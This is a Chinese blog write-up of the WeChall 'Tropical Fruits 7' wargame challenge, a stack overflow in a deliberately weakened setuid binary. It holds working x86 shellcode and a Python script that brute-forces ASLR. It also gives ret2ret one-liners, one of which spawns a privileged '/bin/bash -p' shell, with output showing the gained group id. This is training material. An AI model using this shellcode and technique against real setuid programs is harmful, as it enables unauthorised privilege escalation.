<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.83.1"><title>Writeup-Training: Warchall - 7 Tropical Fruits - /home/cubl</title><meta property="og:title" content="Writeup-Training: Warchall - 7 Tropical Fruits - /home/cubl"><link href=/favicon.ico rel=icon type=image/x-icon><link rel=stylesheet href=/css/fonts.css media=all><link rel=stylesheet href=/css/main.css media=all><script src=/js/source-code-pro.js></script></head><body><div class=wrapper><header class=header><nav class=nav><a href=/ class=nav-logo><img src=/images/logo-min.png width=50 height=50 alt=Logo></a><ul class=nav-links><li><a href=/tags/>Tags</a></li><li><a href=/about/>About</a></li><li><a href=https://github.com/cubarco/cubarco.github.io>GitHub</a></li></ul></nav></header><main class=content role=main><article class=article><h1 class=article-title>Writeup-Training: Warchall - 7 Tropical Fruits</h1><span class=article-date>2014-05-14</span>
<a class=article-tag href=/tags/hack>Hack</a>
<a class=article-tag href=/tags/python>Python</a>
<a class=article-tag href=/tags/writeup>Writeup</a><div class=article-content><p style=color:#000>Challenge URL：<a style=color:#294666 href=http://www.wechall.net/challenge/warchall/tropical/7/index.php>Training: Warchall &#8211; 7 Tropical Fruits</a></p><p>Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！</p><p>做这题的时候也是我第一次写shellcode，不过这道题难点不在于shellcode怎么写，而在于坑爹的ASLR。不说stack的地址一直在变，居然连linux-gate.so都在变！</p><p>一开始查了好久，发现个思路叫ret2libc，然后我gdb了一下，发现system()的地址虽然是随机的，但是有6位是不变的。然后我就撸啊撸，撸了个shell脚本，速度不错，居然半分钟之内就能把system(“sh”)跑出来。看到”sh-4.2$”的时候我那叫一个激动啊。坑爹的是system()这货执行的时候居然会丢掉suid的权限(man system#NOTES)。</p><p>所以忙活了一天，我的成果就是，在一个shell下面，再开一个shell……</p><p>然后第二天我不甘心啊，就找啊找找啊找，找到了exec函数族。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span><span style=color:#66d9ef>extern</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>environ;
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>execl</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>arg, ...);
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>execlp</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>file, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>arg, ...);
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>execle</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>arg, ..., <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>const</span> envp[]);
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>execv</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> argv[]);
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>execvp</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>file, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> argv[]);
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>execve</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> argv[], <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> envp[]);
<span style=color:#75715e>//其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。
</span></code></pre></td></tr></table></div></div><p>这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。</p><p>第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>gcc -fno-stack-protector -z execstack level7.c -o level7
chmod <span style=color:#ae81ff>6755</span> level7
</code></pre></td></tr></table></div></div><p>是的…出题者把DEP关掉了…然后我就睡不着了</p><h2 id=解法>解法：</h2><p>今天早上考完离散就立马赶回寝室继续撸这道题，虽然解法很很蠢(对stack的5个随机位进行碰撞)，但是至少能在10分钟内出结果……</p><p>先给solution.txt建一个到工作目录软连接:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>$ ln -s /home/level/tropic/7/solution.txt ./lk
</code></pre></td></tr></table></div></div><p>然后跑这个python脚本：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># -*- coding=utf8 -*-</span>
__author__ <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Cubarco&#39;</span>


<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>tropic_crack</span>():
    <span style=color:#66d9ef>try</span>:
        shellcode <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1</span><span style=color:#ae81ff>\xc0\x99</span><span style=color:#e6db74>Rh/cath/bin</span><span style=color:#ae81ff>\x89\xe3</span><span style=color:#e6db74>Rh./lk&#34;</span> \
                    <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x89\xe1\xb0\x0b</span><span style=color:#e6db74>RQS</span><span style=color:#ae81ff>\x89\xe1\xcd\x80</span><span style=color:#e6db74>&#34;</span>
        stack_hex <span style=color:#f92672>=</span> hex(random<span style=color:#f92672>.</span>randint(<span style=color:#ae81ff>0xbf00000</span>, <span style=color:#ae81ff>0xbffffff</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>0x10</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0x01</span>)[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
        stack_int <span style=color:#f92672>=</span> int(stack_hex, <span style=color:#ae81ff>16</span>)
        path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/home/level/tropic/7/level7&#34;</span>
        args <span style=color:#f92672>=</span> [path,
                <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>312</span><span style=color:#f92672>-</span>len(shellcode))
                <span style=color:#f92672>+</span> shellcode
                <span style=color:#f92672>+</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&amp;lt;L&#39;</span>, stack_int)]
        args[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> args[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;(&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>(&#34;</span>)\
                         <span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\&#34;</span><span style=color:#e6db74>&#34;</span>)\
                         <span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;)&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>)&#34;</span>)\
                         <span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>&#34;</span>)\
                         <span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\&#39;</span><span style=color:#e6db74>&#34;</span>)
        p <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>Popen(args,
                             stdout<span style=color:#f92672>=</span>subprocess<span style=color:#f92672>.</span>PIPE,
                             stderr<span style=color:#f92672>=</span>subprocess<span style=color:#f92672>.</span>PIPE,
                             shell<span style=color:#f92672>=</span>False)
        rsp <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>read()
        <span style=color:#66d9ef>if</span> rsp <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;&#39;</span>:
            <span style=color:#66d9ef>print</span> rsp
    <span style=color:#66d9ef>except</span>:
        <span style=color:#75715e># print traceback.format_exc()</span>
        <span style=color:#75715e># 好像subprocess开太快了会出问题...</span>
        <span style=color:#66d9ef>pass</span>


<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
    <span style=color:#f92672>import</span> struct
    <span style=color:#f92672>import</span> random
    <span style=color:#f92672>import</span> subprocess
    <span style=color:#f92672>import</span> traceback
    
    <span style=color:#66d9ef>while</span> True:
        tropic_crack()
</code></pre></td></tr></table></div></div><p>做完题去题解讨论区看到个ret2ret的思路感觉好棒，有时间研究一下。</p><p>对了，跑脚本的时候如果它卡住了而且ctrl+c关不掉请不要来打我。正确姿势是killall…..</p><p>UPDATE: 刚看了一下ret2ret，我想去死一死了。是的，只用下面一句话就能搞定，oh，前提还是给solution.txt建立一个到工作目录的软链接，名字是lk（其实是因为./lk刚好是四字节， 如果用原来的路径好麻烦还要四字节对齐，偷个懒）</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>$ /home/level/tropic/7/level7 <span style=color:#e6db74>`</span>python -c <span style=color:#e6db74>&#34;print &#39;\x90&#39;*(312-33)+&#39;1\xc0\x99Rh/cath/bin\x89\xe3Rh./lk\x89\xe1\xb0\x0bRQS\x89\xe1\xcd\x80&#39;+&#39;\xd2\x84\x04\x08&#39;&#34;</span><span style=color:#e6db74>`</span>
<span style=color:#75715e># 0x080484d2是程序里面一个执行ret指令的地址，随便挑！</span>
</code></pre></td></tr></table></div></div><p>更BT一点还可以这样，跑一个/bin/bash -p：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>$ /home/level/tropic/7/level7 <span style=color:#e6db74>`</span>python -c <span style=color:#e6db74>&#34;print &#39;\x90&#39;*(312-33)+&#39;j\x0bX\x99Rfh-p\x89\xe1Rjhh/bash/bin\x89\xe3RQS\x89\xe1\xcd\x80&#39;+&#39;\xd2\x84\x04\x08&#39;&#34;</span><span style=color:#e6db74>`</span>
bash-4.2$ id
uid<span style=color:#f92672>=</span>4057<span style=color:#f92672>(</span>cubarco<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>4057<span style=color:#f92672>(</span>cubarco<span style=color:#f92672>)</span> egid<span style=color:#f92672>=</span>1008<span style=color:#f92672>(</span>level7<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>4057<span style=color:#f92672>(</span>cubarco<span style=color:#f92672>)</span>
<span style=color:#75715e># 然后你就有level7的egid了...</span>
</code></pre></td></tr></table></div></div><h2 id=参考> 参考：</h2><ol><li>Hackers Hut#<a href=http://www.win.tue.nl/~aeb/linux/hh/hh-10.html>Smashing The Stack</a>(ASLR bypassing overview)</li><li><a href=http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf>Performing a ret2libc Attack</a>(ret2libc)</li><li><a href=http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Return_to_libc/Return_to_libc.pdf>Return-to-libc Attack Lab</a>(ret2libc)</li><li><a href=http://web.textfiles.com/hacking/smackthestack.txt>Smack the Stack</a>(ret2ret)</li></ol></div></article><script src=https://utteranc.es/client.js repo=cubarco/cubarco.github.io issue-term=pathname theme=boxy-light crossorigin=anonymous async></script></main><footer class=footer><ul class=footer-links><li><a href=/index.xml type=application/rss+xml target=_blank>RSS feed</a></li><li><a href=https://gohugo.io/ class=footer-links-kudos target=_blank>Made with <img src=/images/hugo-logo.png alt="Img link to Hugo website" width=22 height=22></a></li><li><a>© 2014 - 2014</a></li></ul></footer></div><script src=/js/math-code.js></script><script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>